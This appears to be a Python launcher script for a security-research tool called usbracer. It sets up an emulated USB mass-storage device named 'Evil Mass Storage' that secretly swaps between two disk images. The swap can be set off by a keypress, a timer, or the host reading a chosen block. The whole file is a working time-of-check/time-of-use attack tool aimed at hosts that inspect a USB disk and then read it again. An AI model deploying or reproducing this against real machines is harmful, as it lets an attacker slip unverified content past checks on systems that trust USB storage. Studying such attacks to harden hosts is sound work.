#!/usr/bin/env python

def main():
    import logging
    import argparse
    import asyncio
    import sys

    from usbracer.disks import MMapDiskImage, COWDiskImage, TOCOTUDiskImage
    from usbracer.gadget import Gadget, Configuration
    from usbracer.mass_storage import MassStorage

    parser = argparse.ArgumentParser()
    parser.add_argument("image_a", help="Path to disk image")
    parser.add_argument("image_b", help="Path second disk image")
    parser.add_argument("--block-size", type=int, default=512)
    parser.add_argument("--toggle-delay", type=float, help="Automatically toggles the disks after a delay (in seconds)")
    parser.add_argument("--toggle-read-block", type=int, help="Toggle disks after a read on a specific block")
    parser.add_argument("--debug-level", default=logging.WARNING)
    args = parser.parse_args()

    logging.basicConfig(level=args.debug_level)
    VENDOR_ID = 0x1234
    PRODUCT_ID = 0x4321

    disk_a = MMapDiskImage(args.image_a, args.block_size)
    disk_b = MMapDiskImage(args.image_b, args.block_size)

    disk_toctou = TOCOTUDiskImage(disk_a, disk_b)

    gadget = Gadget(VENDOR_ID, PRODUCT_ID, manufacture="Anvil", product="Evil Mass Storage")
    config = gadget.add_configuration(Configuration(gadget, "Config-1"))
    func = config.add_function(MassStorage(config,
                                            disk_toctou,
                                            vendor_id="Anvil", product_id="Evil Mass", product_ver="0.1"))

    async def toggle_disk_keyboard():
        print("Hit the enter key to toggle disks!")
        reader = asyncio.StreamReader()
        await asyncio.get_running_loop().connect_read_pipe(
            lambda: asyncio.StreamReaderProtocol(reader), sys.stdin)
        
        async for line in reader:
            print("Toggling disk images!")
            disk_toctou.toggle_disks()

    def toggle_delay():
        print("Toggling disks after delay")
        disk_toctou.toggle_disks()

    def read_callback(offset : int, num_blocks : int):
        blk = args.toggle_read_block
        if blk >= offset and blk <= (offset + num_blocks):
            def do_toggle():
                print(f"Toggling disks after read on {blk}")
                disk_toctou.toggle_disks()
            # let the current handling complete before toggling disks
            asyncio.get_running_loop().call_soon(do_toggle)
            func.read_callbacks.remove(read_callback)

    async def main():
        keyboard_toggle = asyncio.create_task(toggle_disk_keyboard())

        if args.toggle_delay != None:
            print(f"Scheduling a toggle after {args.toggle_delay:.2f} seconds")
            asyncio.get_running_loop().call_later(args.toggle_delay, toggle_delay)
        
        if args.toggle_read_block != None:
            func.read_callbacks.append(read_callback)

        await gadget.run()

    asyncio.run(main())

if __name__ == "__main__":
    main()
    